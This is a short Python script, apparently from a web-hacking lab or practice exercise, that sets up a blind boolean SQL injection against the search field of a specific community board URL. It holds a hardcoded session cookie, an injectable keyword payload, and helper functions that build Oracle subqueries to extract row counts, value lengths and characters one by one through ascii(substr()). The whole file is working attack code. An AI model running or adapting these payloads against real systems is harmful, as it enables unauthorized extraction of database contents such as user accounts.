### VAL AREA
targetURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
cookies = {"JSESSIONID": "8623A875E3EA6CF5471045FFA0614F6F"}
data = {
    "startDt": "",
    "endDt": "",
    "searchType": "all",
    "keyword": "aaaa%' and 'a%'='a",
}

targetString = "카카오"

baseQuery = "aaaa%' and {} and 'a%'='a"


def get_count(column, table):
    countQuery = (
        "(SELECT COUNT(" + column + ") AS total_usernames FROM " + table + ") > "
    )

    return baseQuery.format(countQuery)


def get_index(column, table):
    indexQuery = (
        "(SELECT length("
        + column
        + ") FROM (SELECT "
        + column
        + ", rownum as rnum FROM "
        + table
        + ") WHERE rnum = {}) > "
    )

    return baseQuery.format(indexQuery)


def get_data(column, table):
    dataQuery = (
        "(SELECT ascii(substr("
        + column
        + ", {}, 1)) FROM (SELECT "
        + column
        + ", rownum as rnum FROM "
        + table
        + ") WHERE rnum = {}) > "
    )

    return baseQuery.format(dataQuery)


def get_val(var_name):
    if var_name in globals():
        return globals()[var_name]
    else:
        return None
